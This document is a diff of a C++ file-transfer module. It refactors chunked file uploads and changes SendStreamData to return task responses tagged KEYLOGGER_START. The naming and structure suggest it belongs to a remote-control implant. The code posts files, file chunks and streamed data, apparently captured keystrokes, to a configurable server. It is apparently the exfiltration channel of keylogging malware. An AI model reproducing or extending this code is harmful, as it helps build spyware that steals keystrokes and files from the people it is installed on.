@@ -7,6 +7,7 @@
 #include <fstream>
 #include <string>
 #include <vector>
+#include <Task.h>
 
 namespace fs = std::filesystem;
 
@@ -16,18 +17,18 @@ namespace FileTransfer
     {
         const fs::path StorageDirectory = "storage";
 
-        std::string FileDirectory(const std::string& transferId)
+        std::string FileDirectory(const std::string &transferId)
         {
             return (StorageDirectory / "files" / transferId).string();
         }
 
         bool PostBinary(
-            const std::string& url,
-            const char* data,
+            const std::string &url,
+            const char *data,
             std::size_t size,
-            const std::string& fileName = {})
+            const std::string &fileName = {})
         {
-            CURL* curl = curl_easy_init();
+            CURL *curl = curl_easy_init();
 
             if (!curl)
                 return false;
@@ -40,7 +41,7 @@ namespace FileTransfer
                 CURLOPT_POSTFIELDSIZE,
                 static_cast<long>(size));
 
-            curl_slist* headers =
+            curl_slist *headers =
                 curl_slist_append(
                     nullptr,
                     "Content-Type: application/octet-stream");
@@ -80,9 +81,9 @@ namespace FileTransfer
     }
 
     bool SendFile(
-        const std::string& filePath,
-        const std::string& transferId,
-        const std::string& apiUrl,
+        const std::string &filePath,
+        const std::string &transferId,
+        const std::string &apiUrl,
         std::size_t chunkSize)
     {
         if (chunkSize == 0)
@@ -126,50 +127,60 @@ namespace FileTransfer
                     return false;
             }
 
-            return PostBinary(
-                baseUrl + "/" + fileName + "/file",
-                data.empty() ? nullptr : data.data(),
-                data.size(),
-                fileName);
-        }
-
-        // Large files are sent in chunks.
-        std::vector<char> buffer(chunkSize);
-
-        int chunkNumber = 0;
-
-        while (
-            file.read(
-                buffer.data(),
-                static_cast<std::streamsize>(buffer.size()))
-            || file.gcount() > 0)
-        {
-            const auto count = file.gcount();
-
-            if (count <= 0)
-                break;
-
             if (!PostBinary(
-                    baseUrl +
-                        "/chunks/" +
-                        std::to_string(chunkNumber++),
+                    baseUrl + "/" + fileName + "/file",
+                    data.empty() ? nullptr : data.data(),
+                    data.size(),
+                    fileName))
+            {
+                return false;
+            }
+        }
+        else
+        {
+            // Large files are sent in chunks.
+            std::vector<char> buffer(chunkSize);
+
+            int chunkNumber = 0;
+
+            while (
+                file.read(
                     buffer.data(),
-                    static_cast<std::size_t>(count)))
+                    static_cast<std::streamsize>(buffer.size())) ||
+                file.gcount() > 0)
+            {
+                const auto count = file.gcount();
+
+                if (count <= 0)
+                    break;
+
+                if (!PostBinary(
+                        baseUrl +
+                            "/chunks/" +
+                            std::to_string(chunkNumber++),
+                        buffer.data(),
+                        static_cast<std::size_t>(count)))
+                {
+                    return false;
+                }
+            }
+
+            // Tell the server to rebuild the uploaded chunks.
+            if (!PostBinary(
+                    baseUrl + "/rebuild",
+                    nullptr,
+                    0))
             {
                 return false;
             }
         }
 
-        // Tell the server to rebuild the uploaded chunks.
-        return PostBinary(
-            baseUrl + "/rebuild",
-            nullptr,
-            0);
+        return true;
     }
 
     bool RebuildFile(
-        const std::string& transferId,
-        const std::string& outputPath)
+        const std::string &transferId,
+        const std::string &outputPath)
     {
         const fs::path directory =
             FileDirectory(transferId);
@@ -179,7 +190,7 @@ namespace FileTransfer
 
         std::vector<fs::path> chunks;
 
-        for (const auto& entry :
+        for (const auto &entry :
              fs::directory_iterator(directory))
         {
             if (entry.is_regular_file())
@@ -200,7 +211,7 @@ namespace FileTransfer
         if (!output)
             return false;
 
-        for (const auto& chunk : chunks)
+        for (const auto &chunk : chunks)
         {
             std::ifstream input(
                 chunk,
@@ -218,17 +229,31 @@ namespace FileTransfer
         return true;
     }
 
-    bool SendStreamData(
-        const std::string& streamId,
-        const std::string& data,
-        const std::string& apiUrl)
+    Response SendStreamData(
+        const std::string &streamId,
+        const std::string &data,
+        const std::string &apiUrl)
     {
-        return PostBinary(
-            apiUrl +
-                "/api/streams/" +
-                streamId +
-                "/data",
-            data.data(),
-            data.size());
+        if (!PostBinary(
+                apiUrl + "/api/streams/" + streamId + "/data",
+                data.data(),
+                data.size()))
+        {
+            return CreateTaskResponse(
+                std::stoi(streamId),
+                KEYLOGGER_START,
+                NO_CODE,
+                TASK_ERROR,
+                TaskError{
+                    NO_CODE,
+                    "Failed to post stream data"});
+        }
+
+        return CreateTaskResponse(
+            std::stoi(streamId),
+            KEYLOGGER_START,
+            NO_CODE,
+            SUCCESS,
+            TaskSuccess{"true"});
     }
 }
